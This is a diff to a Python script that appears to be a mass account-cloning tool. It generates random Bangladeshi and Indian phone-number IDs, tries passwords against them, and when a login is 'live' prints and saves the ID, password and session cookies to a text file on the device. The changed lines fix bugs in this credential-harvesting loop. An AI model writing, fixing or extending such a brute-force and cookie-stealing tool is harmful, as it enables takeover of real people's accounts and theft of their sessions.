@@ -22,7 +22,7 @@ a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\
 #-----------------------[ HEXXX-CODE ]-----------------------#
 user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
 #-----------------------[ SC-CODE ]-----------------------#
-main_x = '(1) Bd Random \n (2) India random \n (3) Exit menu';bd_x = '017 | 018 | 019';ind_x = '+91639 | +91600 | +91620';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
+main_x = '(1) Bd Random \n (2) India random \n (3) Exit menu';bd_x = '017 | 018 | 019';ind_x = '+91639 | +91600 | +91620';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';c = 'Choice'
 #-----------------------[ LOGO-CODE ]-----------------------#
 logo = f"""
 \033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
@@ -1373,9 +1373,9 @@ def rndmx(ids,pasx,tl):
                                 if 'live' in reqx:
                                         print(f'\r\r{G}[ATOM-OK]: {uid} | {pas}')
                                         print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-                                        open('/sdcard/PAISAOK-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+                                        open('/sdcard/PAISAOK-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                                         open('/sdcard/UGEN.txt','a').write(user_agent+'\n')
-                                        ok+=1
+                                        ok.append(str(uid))
                                         break
                                 if 'lock' in reqx:
                                         print(f'\r\r{p}[LOCK]: {uid} | {pas}')
